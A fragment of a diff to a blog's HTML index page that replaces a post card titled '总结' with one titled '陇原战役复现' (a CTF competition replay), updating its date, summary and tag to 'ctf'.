+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="陇原战役复现">
                         
-                        <span class="card-title">总结</span>
+                        <span class="card-title">陇原战役复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            随便写点东西，写的挺乱的
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-31
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-12
                             </span>
                         <span class="publish-author">
                             
@@ -1161,8 +1347,8 @@ The file will have its original line endings in your working directory
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E9%9A%8F%E7%AC%94/">
-                        <span class="chip bg-color">随笔</span>
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
                     </a>
                     
                 </div>
